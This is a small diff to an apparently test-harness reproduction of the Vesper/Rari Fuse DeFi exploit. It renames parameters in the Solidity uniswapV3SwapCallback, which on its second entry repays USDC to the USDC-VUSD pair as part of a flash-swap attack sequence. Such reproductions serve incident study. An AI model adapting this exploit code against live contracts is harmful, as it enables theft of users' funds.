@@ -238,7 +238,7 @@ contract Exploit_VesperRariFuse is TestHarness, ModuleImports {
         logBalances(address(this));
     }
 
-    function uniswapV3SwapCallback(int256 arg0, int256 arg1, bytes memory arg2) external {
+    function uniswapV3SwapCallback(int256 /* amount0Delta */, int256 amount1Delta,  bytes memory /* data */) external {
         // Means that this callback is called for the first time while getting USDC
         timesEntered++;
         if(timesEntered == 1){
@@ -251,7 +251,7 @@ contract Exploit_VesperRariFuse is TestHarness, ModuleImports {
         if(timesEntered == 2){
             require(msg.sender == address(pairUsdcVusd), 'Only USDC-VUSD pair');
 
-            IERC20(tokens[0]).transfer(address(pairUsdcVusd), uint256(arg1)); // Send the USDC counterpart
+            IERC20(tokens[0]).transfer(address(pairUsdcVusd), uint256(amount1Delta)); // Send the USDC counterpart
         }
     }
 
